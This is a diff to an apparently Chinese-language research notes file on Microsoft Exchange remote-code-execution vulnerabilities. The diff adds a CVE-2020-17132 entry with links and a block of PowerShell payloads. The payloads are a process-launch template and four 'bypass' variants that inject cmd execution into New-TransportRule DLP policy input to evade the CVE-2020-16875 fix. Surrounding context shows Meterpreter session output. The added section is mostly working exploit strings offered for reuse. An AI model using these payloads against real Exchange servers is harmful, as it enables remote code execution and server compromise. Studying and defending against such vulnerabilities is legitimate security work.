@@ -20,6 +20,7 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | CVE-2019-1373 () | [CVE-2019-1373](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1373) | Nov 12, 2019 | Microsoft Exchange Remote Code Execution Vulnerability | yes |
 | CVE-2020-0688 (completed) | [CVE-2020-0688](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0688) | Feb 11, 2020 | Microsoft Exchange Validation Key Remote Code Execution Vulnerability | yes |
 | CVE-2020-16875 (completed) | [CVE-2020-16875](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-16875) | Sep 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution | yes |
+| CVE-2020-17132 (completed) | [CVE-2020-17132](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-17132) | Dec 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution CVE-2020-16875 bypass | yes |
 | CVE-2020-17083 | [CVE-2020-17083]() |  |  | yes |
 | CVE-2020-17143 | [CVE-2020-17143]() |  |  | yes |
 | CVE-2020-17144 | [CVE-2020-17144]() |  |  | yes |
@@ -319,8 +320,6 @@ viewstate 的反序列化，成为第一个能直接在 exchange 服务器上执
  - [Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution](https://packetstormsecurity.com/files/159210/Microsoft-Exchange-Server-DlpUtils-AddTenantDlpPolicy-Remote-Code-Execution.html)
  - [CVE-2020-16875 python poc](https://srcincite.io/pocs/cve-2020-16875.py.txt)
  - [CVE-2020-16875 powershell poc](https://srcincite.io/pocs/cve-2020-16875.ps1.txt)
- - [CVE-2020-16875 Protection/Filter Bypass](https://raw.githubusercontent.com/x41sec/advisories/master/X41-2020-007/x41mas-2020-007-microsoft-exchange-rce.txt)
- - [Microsoft Exchange Remote Code Execution - CVE-2020-16875](https://www.x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/)
  - [CVE-2020-16875：Microsoft Exchange RCE复现](https://cloud.tencent.com/developer/article/1704777)
  - [Exchange漏洞分析系列 CVE-2020-16875](https://www.anquanke.com/post/id/219091)
  - [metasploit exchange_ecp_dlp_policy.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_ecp_dlp_policy.rb)
@@ -405,6 +404,37 @@ Logged On Users : 8
 Meterpreter     : x64/windows
 meterpreter >
 ```
+
+# CVE-2020-17132 (completed)
+## CVE-2020-17132 part links
+
+ - [Making Clouds Rain :: Remote Code Execution in Microsoft Office 365](https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html)
+ - [CVE-2020-16875 Protection/Filter Bypass](https://raw.githubusercontent.com/x41sec/advisories/master/X41-2020-007/x41mas-2020-007-microsoft-exchange-rce.txt)
+ - [Microsoft Exchange Remote Code Execution - CVE-2020-16875](https://www.x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/)
+
+
+$i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start()
+
+bypass1:
+neW-tRaNsPoRtRuLe $([Diagnostics.Process]::Start("cmd", "/c %s")) #-dLpPoLiCy
+neW-tRaNsPoRtRuLe fdvoid0; [Diagnostics.Process]::Start("cmd", "/c %s") #-dLpPoLiCy
+
+bypass2:
+neW-tRaNsPoRtRuLe fdvoid0; $poc='New-object'; $i = & $poc System.Diagnostics.ProcessStartInfo; $i.UseShellExecute = $true; $i.FileName="cmd"; $i.Arguments="/c %s"; $r = & $poc System.Diagnostics.Process; $r.StartInfo = $i; $r.Start() #-dLpPoLiCy
+
+bypass3:
+neW-tRaNsPoRtRuLe $([Diagnostics.Process]::Start("cmd", "/c %s")) -DlpPolicy "%%DlpPolicyName%%"
+
+bypass4:
+& 'Invoke-Expression' '[Diagnostics.Process]::Start("cmd","/c %s")'; New-TransportRule -DlpPolicy
+
+
+
+
+
+
+
+
 
 # CVE-2020-17083
 ## CVE-2020-17083 part links
